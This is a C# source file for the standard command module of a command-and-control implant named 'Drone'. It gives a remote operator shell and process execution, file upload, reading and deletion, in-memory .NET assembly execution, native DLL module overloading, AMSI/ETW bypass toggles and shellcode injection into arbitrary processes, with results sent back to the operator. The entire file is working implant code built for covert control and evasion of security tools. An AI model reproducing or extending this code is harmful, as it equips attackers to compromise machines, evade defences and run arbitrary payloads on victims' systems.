using System;
using System.Collections.Generic;
using System.Diagnostics;   
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.Invocation.DynamicInvoke;
using Drone.Invocation.Injection;
using Drone.Invocation.ManualMap;
using Drone.Models;
using Drone.Modules;
using Drone.SharpSploit.Enumeration;
using Drone.SharpSploit.Execution;

using Assembly = Drone.SharpSploit.Execution.Assembly;

namespace Drone
{
    public class StandardApi : DroneModule
    {
        public override string Name => "stdapi";

        public override List<Command> Commands => new List<Command>
        {
            new("pwd", "Print working directory", GetCurrentDirectory),
            new("cd", "Change working directory", ChangeCurrentDirectory, new List<Command.Argument>
            {
                new("path")
            }),
            new("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
            {
                new("path")
            }),
            new("upload", "Upload a file to the current working directory of the Drone", UploadFile, new List<Command.Argument>
            {
               new("/path/to/origin", false, true),
               new("destination-filename" ,false)
            }),
            new("rm", "Delete a file", DeleteFile, new List<Command.Argument>
            {
               new("/path/to/file", false)
            }),
            new("rmdir", "Delete a directory", DeleteDirectory, new List<Command.Argument>
            {
                new("/path/to/directory", false)
            }),
            new("mkdir", "Create a directory", CreateDirectory, new List<Command.Argument>
            {
               new("/path/to/new-dir", false) 
            }),
            new("cat", "Read a file as text", ReadTextFile, new List<Command.Argument>
            {
                new("/path/to/file.txt")
            }),
            new("ps", "List running processes", GetProcessListing),
            new("getuid", "Get current identity", GetCurrentIdentity),
            new("services", "List services on the current or target machine", ListServices, new List<Command.Argument>
            {
                new("computerName")
            }),
            new("shell", "Run a command via cmd.exe", ExecuteShellCommand, new List<Command.Argument>
            {
                new("args", false)
            }),
            new("run", "Run a command", ExecuteRunCommand, new List<Command.Argument>
            {
                new("args")
            }),
            new ("execute-assembly", "Execute a .NET assembly", ExecuteAssembly, new List<Command.Argument>
            {
                new("/path/to/assembly.exe", false, true),
                new("args")
            }, hookable: true),
            new("overload", "Map and execute a native DLL", OverloadNativeDll, new List<Command.Argument>
            {
                new("/path/to/file.dll", false, true),
                new("export-name", false),
                new("args")
            }, hookable: true),
            new("bypass", "Set a directive to bypass AMSI/ETW on tasks", SetBypass, new List<Command.Argument>
            {
                new("amsi/etw", false),
                new("true/false")
            }),
            new("shinject", "Inject arbitrary shellcode into a process", ShellcodeInject, new List<Command.Argument>
            {
                new("/path/to/shellcode.bin", false, true),
                new("pid", false)
            })
        };

        private void GetCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var result = Host.GetCurrentDirectory();
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ChangeCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var directory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            if (task.Arguments.Length > 0) directory = task.Arguments[0];
            
            Host.ChangeCurrentDirectory(directory);
            var current = Host.GetCurrentDirectory();
            
            Drone.SendResult(task.TaskGuid, current);
        }
        
        private void GetDirectoryListing(DroneTask task, CancellationToken token)
        {
            var directory = Host.GetCurrentDirectory();
            if (task.Arguments.Length > 0) directory = task.Arguments[0];

            var result = Host.GetDirectoryListing(directory);
            
            Drone.SendResult(task.TaskGuid, result.ToString());
        }

        private void UploadFile(DroneTask task, CancellationToken token)
        {
            var path = Path.Combine(Host.GetCurrentDirectory(), task.Arguments[0]);
            File.WriteAllBytes(path, Convert.FromBase64String(task.Artefact));
        }
        
        private void DeleteFile(DroneTask task, CancellationToken token)
        {
            File.Delete(task.Arguments[0]);
        }

        private void DeleteDirectory(DroneTask task, CancellationToken token)
        {
            Directory.Delete(task.Arguments[0]);
        }
        
        private void CreateDirectory(DroneTask task, CancellationToken token)
        {
            Directory.CreateDirectory(task.Arguments[0]);
        }
        
        private void ReadTextFile(DroneTask task, CancellationToken token)
        {
            var text = File.ReadAllText(task.Arguments[0]);
            Drone.SendResult(task.TaskGuid, text);
        }
        
        private void GetProcessListing(DroneTask task, CancellationToken token)
        {
            var result = Host.GetProcessListing();
            Drone.SendResult(task.TaskGuid, result.ToString());
        }

        private void GetCurrentIdentity(DroneTask task, CancellationToken token)
        {
            var identity = WindowsIdentity.GetCurrent().Name;
            Drone.SendResult(task.TaskGuid, identity);
        }
        
        private void ExecuteShellCommand(DroneTask task, CancellationToken token)
        {
            var command = string.Join("", task.Arguments);
            var result = Shell.ExecuteShellCommand(command);
            
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ExecuteRunCommand(DroneTask task, CancellationToken token)
        {
            var command = task.Arguments[0];
            var args = "";

            if (task.Arguments.Length > 1)
                args = string.Join("", task.Arguments.Skip(1));

            var result = Shell.ExecuteRunCommand(command, args);
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ExecuteAssembly(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var ms = new MemoryStream();

            // run this in a task
            var t = Task.Run(() =>
            {
                Assembly.AssemblyExecute(ms, bytes, task.Arguments);
                
            }, token);

            // while task is running, read from stream
            while (!t.IsCompleted && !token.IsCancellationRequested)
            {
                var output = ms.ToArray();
                ms.SetLength(0);
                
                var update = new DroneTaskUpdate(task.TaskGuid, DroneTaskUpdate.TaskStatus.Running, output);
                Drone.SendDroneTaskUpdate(update);

                Thread.Sleep(1000);
            }
            
            // get anything left
            var final = Encoding.UTF8.GetString(ms.ToArray());
            ms.Dispose();
            Drone.SendResult(task.TaskGuid, final);
        }
        
        private void OverloadNativeDll(DroneTask task, CancellationToken token)
        {
            var dll = Convert.FromBase64String(task.Artefact);
            var decoy = Overload.FindDecoyModule(dll.Length);

            if (string.IsNullOrEmpty(decoy))
            {
                Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
                return;
            }

            var map = Overload.OverloadModule(dll, decoy);
            var export = task.Arguments[0];

            object[] funcParams = { };

            if (task.Arguments.Length > 1)
                funcParams = new object[] {string.Join(" ", task.Arguments.Skip(1))};

            var result = (string) Generic.CallMappedDLLModuleExport(
                map.PEINFO,
                map.ModuleBase,
                export,
                typeof(GenericDelegate),
                funcParams);

            Drone.SendResult(task.TaskGuid, result);
            
            Map.FreeModule(map);
        }
        
        private void SetBypass(DroneTask task, CancellationToken token)
        {
            var config = "";

            if (task.Arguments[0].Equals("amsi", StringComparison.OrdinalIgnoreCase))
                config = "BypassAmsi";

            if (task.Arguments[0].Equals("etw", StringComparison.OrdinalIgnoreCase))
                config = "BypassEtw";

            if (string.IsNullOrEmpty(config))
            {
                Drone.SendError(task.TaskGuid, "Not a valid configuration option");
                return;
            }

            var current = Config.GetConfig<bool>(config);

            if (task.Arguments.Length == 2)
            {
                if (!bool.TryParse(task.Arguments[1], out var enabled))
                {
                    Drone.SendError(task.TaskGuid, $"{task.Arguments[1]} is not a value bool");
                    return;
                }

                Config.SetConfig(config, enabled);
                current = Config.GetConfig<bool>(config);
            }

            Drone.SendResult(task.TaskGuid, $"{config} is {current}");
        }
        
        private void ShellcodeInject(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID");
                return;
            }

            var process = Process.GetProcessById(pid);

            var shellcode = Convert.FromBase64String(task.Artefact);
            var payload = new PICPayload(shellcode);

            var allocType = Config.GetConfig<Type>("AllocationTechnique");
            var execType = Config.GetConfig<Type>("ExecutionTechnique");
            
            var self = System.Reflection.Assembly.GetCallingAssembly();
            var types = self.GetTypes();

            var allocationTechnique = (from type in types where type == allocType
                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            var executionTechnique = (from type in types where type == execType
                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();

            var success = Injector.Inject(payload, allocationTechnique, executionTechnique, process);

            if (success)
            {
                Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {process.ProcessName}");
                return;
            }
            
            Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
        }

        private void ListServices(DroneTask task, CancellationToken token)
        {
            var computerName = string.Empty;
            if (task.Arguments.Length > 0) computerName = task.Arguments[0];

            var result = Host.GetServiceListing(computerName);
            Drone.SendResult(task.TaskGuid, result.ToString());
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate string GenericDelegate(string input);
    }
}